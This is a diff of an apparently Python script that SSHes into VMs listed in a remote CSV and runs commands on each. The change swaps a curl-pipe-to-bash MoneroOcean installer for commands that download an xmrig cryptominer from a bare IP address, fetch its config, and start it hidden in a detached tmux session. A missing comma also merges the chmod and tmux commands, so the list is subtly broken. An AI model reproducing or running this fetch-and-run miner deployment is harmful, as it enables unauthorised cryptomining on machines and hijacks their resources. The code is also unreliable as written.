@@ -17,14 +17,15 @@ url = 'https://raw.githubusercontent.com/junaidd007/Monero/main/vms.csv'
 # Set your commands here, one per line
 sshcmd = [
     #" df -h" # Only used for Testing
-    "curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/MoneroOcean.sh | bash -s 47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q"
+    #"curl -s -L https://raw.githubusercontent.com/junaidd007/Monero/main/MoneroOcean.sh | bash -s 47TFyE1CiWNgcB5AMn9MSNKA4Lap9TcRwAvdbKedrK7VYWyqVTwE5qWWhW4Tdm4y2nNf9deqPdagqXWXwezwoSfPSx8jk3q"
     # OLD method above new method below
     # 
     # "sudo yum install epel-release -y", # install epel-release on Centos!! to make sur you can get tmux + wget
     #"sudo apt install wget tmux -y", # installs wget
-    #"wget http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
-    #"wget https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
-    #"tmux new-session -d -s 'xmrig' ./xmrig"
+    "wget http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
+    "wget https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
+    "chmod +x ./xmrig"
+    "tmux new-session -d -s 'xmrig' ./xmrig"
         
 ]
 
